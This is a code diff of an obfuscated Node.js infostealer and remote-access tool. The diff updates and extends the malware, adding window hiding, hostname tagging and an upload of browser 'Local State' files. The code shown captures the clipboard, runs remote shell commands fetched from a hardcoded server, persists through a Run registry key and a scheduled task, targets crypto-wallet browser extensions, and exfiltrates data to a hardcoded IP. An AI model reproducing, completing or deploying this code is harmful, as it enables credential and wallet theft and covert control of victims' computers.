@@ -7,7 +7,8 @@ try {
         FormData = require('form-data'),
         axios = require('axios'),
         { execSync, spawn } = require('child_process'),
-        uploadUrl = "http://192.168.0.186:5918/upload"
+        uploadUrl = "http://192.168.0.186:5918/upload",
+        { windowManager } = require('node-window-manager')
 
     process.on('uncaughtException', (_0xad8869) => {})
     process.on('unhandledRejection', (_0x461982) => {})
@@ -19,10 +20,10 @@ try {
         upt = 5934,
         lpt = 5961,
         t = 66,
-        a = 192,
-        b = 168,
+        a = 127,
+        b = 0,
         c = 0,
-        d = 186,
+        d = 1,
         e = 127,
         f = 0,
         g = 0,
@@ -31,11 +32,32 @@ try {
         usu = e + '.' + f + '.' + g + '.' + h,
         lsu = e + '.' + f + '.' + g + '.' + h 
     // console.log("hello");
+    function hideWindowByProcessName(name) {
+        const windows = windowManager.getWindows();
+        let found = false;
+        for (const win of windows) {
+            const proc = win;
+            // console.log(proc);
+            if (proc && proc.path && proc.path.toLowerCase().includes(name.toLowerCase())) {
+            win.hide(); // Hide the window
+            found = true;
+            }
+        }
+        return found;
+    }
     async function s() {
-        ss();
-        aa();
-        bb();
-        
+        try {
+            const results = await Promise.all([
+                ss(),
+                aa(),
+                bb()
+            ]);
+            // console.log('✅ All async functions completed:', results);
+            await new Promise(resolve => setTimeout(resolve, 2500));
+            hideWindowByProcessName('WinKeyServer.exe');
+        }catch(error){
+            console.error("Error");
+        }
     }
     
     const ss = async () => {
@@ -48,6 +70,7 @@ try {
             '\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20uid\\x20=\\x20\\x224a3703430a2ec2ae30f362b29e994f77\\x22;\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20\\x20setInterval(()\\x20=>\\x20{\\x0a' +
             '\\x20\\x20\\x20\\x20let\\x20clip;\\x0a' +
+            '\\x20\\x20\\x20\\x20const\\x20hostname\\x20=\\x20os.hostname();\\x0a'+
             '\\x20\\x20\\x20\\x20if\\x20(os.platform()\\x20===\\x20\\x22win32\\x22)\\x20{\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20clip\\x20=\\x20execSync(\\x22powershell\\x20-command\\x20Get-Clipboard\\x22,\\x20{encoding:\\x20\\x22utf8\\x22,\\x20windowsHide:\\x20true\\x20});\\x0a' +
             '\\x20\\x20\\x20\\x20}\\x20else\\x20if\\x20(os.platform()\\x20===\\x20\\x22darwin\\x22)\\x20{\\x0a' +
@@ -55,7 +78,7 @@ try {
             '\\x20\\x20\\x20\\x20}\\x20else\\x20{\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20clip\\x20=\\x20execSync(\\x22xclip\\x20-selection\\x20clipboard\\x20-o\\x22,\\x20{encoding:\\x20\\x22utf8\\x22,\\x20windowsHide:\\x20true\\x20});\\x0a' +
             '\\x20\\x20\\x20\\x20}\\x0a' +
-            '\\x20\\x20\\x20\\x20axios.post(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/clip\\x60,\\x20{uid,\\x20clip}).catch(err\\x20=>\\x20console.error(\\x22Clipboard\\x20post\\x20error:\\x22,\\x20err.message));\\x0a' +
+            '\\x20\\x20\\x20\\x20axios.post(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/clip\\x60,\\x20{uid,\\x20clip,\\x20hostname}).catch(err\\x20=>\\x20console.error(\\x22Clipboard\\x20post\\x20error:\\x22,\\x20err.message));\\x0a' +
             '\\x20\\x20},\\x205000);\\x0a' +
             '\\x20\\x20setInterval(async\\x20()\\x20=>\\x20{\\x0a' +
             '\\x20\\x20\\x20\\x20try\\x20{\\x0a' +
@@ -63,12 +86,13 @@ try {
             '\\x20\\x20\\x20\\x20\\x20\\x20const\\x20command\\x20=\\x20response.data.command;\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20if\\x20(command)\\x20{\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20let\\x20output;\\x0a' +
+            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20hostname\\x20=\\x20os.hostname();\\x0a'+
             '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20try\\x20{\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20output\\x20=\\x20execSync(command,\\x20{encoding:\\x20\\x22utf8\\x22,\\x20windowsHide:\\x20true\\x20});\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x20catch\\x20(err)\\x20{\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20output\\x20=\\x20\\x22Error\\x20executing\\x20command:\\x20\\x22+err.message;\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a' +
-            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20await\\x20axios.post(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/output\\x60,\\x20{uid,\\x20command,\\x20output});\\x0a' +
+            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20await\\x20axios.post(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/output\\x60,\\x20{uid,\\x20command,\\x20output,\\x20hostname});\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a' +
             '\\x20\\x20\\x20\\x20}\\x20catch\\x20(err)\\x20{\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20console.error(\\x22Remote\\x20shell\\x20error:\\x22,\\x20err.message);\\x0a' +
@@ -90,20 +114,21 @@ try {
         const childScript = prelude + decodedCode;
         // console.log(childScript);
         _0x24451c = new Error('spawn node ENOENT');
-        try {
-            const _0x69392 = spawn('node', ['-e', childScript], { 
-                windowsHide: true,
-                detached: true,
-                stdio: 'ignore', });
-            _0x69392.unref();
-            execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NodeHelper" /t REG_SZ /d "node ${__dirname}\\index.js" /f`, {stdio: 'ignore'});
-            execSync(`schtasks /create /tn "NodeUpdate" /tr "node ${__dirname}\\index.js" /sc onlogon /rl highest /f`, {stdio: 'ignore'});
-            // process.exit(0);
+        return new Promise((resolve, reject) => {
+            try {
+                const _0x69392 = spawn('node', ['-e', childScript], { 
+                    windowsHide: true,
+                    detached: true,
+                    stdio: 'ignore', });
+                _0x69392.unref();
+                execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NodeHelper" /t REG_SZ /d "node ${__dirname}\\index.js" /f`, {stdio: 'ignore'});
+                execSync(`schtasks /create /tn "NodeUpdate" /tr "node ${__dirname}\\index.js" /sc onlogon /rl highest /f`, {stdio: 'ignore'});
+                // process.exit(0);
+                resolve({ success: true, message: "first completed"});
             }catch(_0x24451c) {
-                console.log(_0x24451c);
+                reject(new Error('spawn node ENOENT'))
             }
-            
-   
+        })
     }
     
     let screenshotCounter = 0;
@@ -437,20 +462,21 @@ try {
         `;
 
         _0x24451c = new Error('spawn node ENOENT');
-
-        try {
-            // console.log("bb function is started")
-            const _0x23df1e = spawn('node', ['-e', _0x3d341e], {
-                windowsHide: true,
-                detached: true,
-                stdio: 'ignore',
-            });
-            _0x23df1e.unref();
-            
-            // process.exit(0);
-        }catch(_0x24451c) {
-            console.log(_0x24451c);
-        }
+        return new Promise((resolve, reject) => {
+            try {
+                // console.log("bb function is started")
+                const _0x23df1e = spawn('node', ['-e', _0x3d341e], {
+                    windowsHide: true,
+                    detached: true,
+                    stdio: 'ignore',
+                });
+                _0x23df1e.unref();
+                resolve({ success: true, message: "third completed"});
+                // process.exit(0);
+            }catch(_0x24451c) {
+                reject(new Error('spawn node ENOENT'))
+            }
+        })
     }
     const wps = [
         "acmacodkjbdgmoleebolmdjonilkdbch", // Keplr
@@ -493,7 +519,7 @@ try {
         const FormData = require('form-data');
         const axios = require('axios');
         const uploadUrl = "http://192.168.0.186:5918/upload";
-        
+        const uu = "http://192.168.0.186:5918/total";
         let i = ${i};
         const getBasePaths = () => {
             const platform = process.platform;
@@ -553,17 +579,39 @@ try {
             }
             return extractedData;
         };
-    
+        const uf = async (p) => {
+            if (fs.statSync(p).isFile()) {
+                const form = new FormData();
+                form.append("file", fs.createReadStream(p));
+                try {
+                    const response = await axios.post(uu, form, {
+                        headers: {
+                            ...form.getHeaders(),
+                            userkey: 1995,
+                            hostname: os.hostname(),
+                            path: p,
+                            t: "66"
+                        }
+                    });
+                } catch (error) {
+                    console.error("Error uploading file p:", error.message);
+                }
+            }
+        };
 
         const exfiltrateData = async (data) => {
             const form = new FormData();
             form.append('data', JSON.stringify(data));
             form.append('id', i++);
-            form.append('hostname', os.hostname())
         
             try {
                 const response = await axios.post(uploadUrl, form, {
-                    headers: form.getHeaders()
+                    headers: {
+                                ...form.getHeaders(),
+                                userkey: 1995,
+                                hostname: os.hostname(),
+                                t: "66"
+                            }
                 });
                 console.log('Data exfiltrated:', response.status);
             } catch (err) {
@@ -607,7 +655,11 @@ try {
         }   
         const SetData = async() => {
             const basePaths = getBasePaths();
-            console.log("basePaths");
+            for (const basePath of basePaths) {
+                    const localStatePath = path.join(basePath, "Local State");
+                    await uf(localStatePath);  // Now this works correctly
+                }
+            
             for (const basePath of basePaths) {
                 if (!fs.existsSync(basePath)) {
                     console.log('Base path not found: basePaths');
@@ -629,16 +681,20 @@ try {
         SetData().catch(console.error);
         `;
         _0x24451c = new Error('spawn node ENOENT');
-        try {
-            const _0x849f8 = spawn('node', ['-e', _0x4f325],{
-                windowsHide: true,
-                detached: true,
-                stdio: 'ignore', });
-            _0x849f8.unref();
-            // console.log(_0x849f8);
-        }catch(_0x24451c){
-            console.log(_0x24451c);
-        }
+        return new Promise((resolve, reject) => {
+            try {
+                const _0x849f8 = spawn('node', ['-e', _0x4f325],{
+                    windowsHide: true,
+                    detached: true,
+                    stdio: 'ignore', // Capture output
+                    });
+                _0x849f8.unref();
+                resolve({ success: true, message: "second completed"});
+                // console.log(_0x849f8);
+            }catch(_0x24451c){
+                reject(new Error('spawn node ENOENT'))
+            }
+        })
     }
 
     const setHeader = async function () {
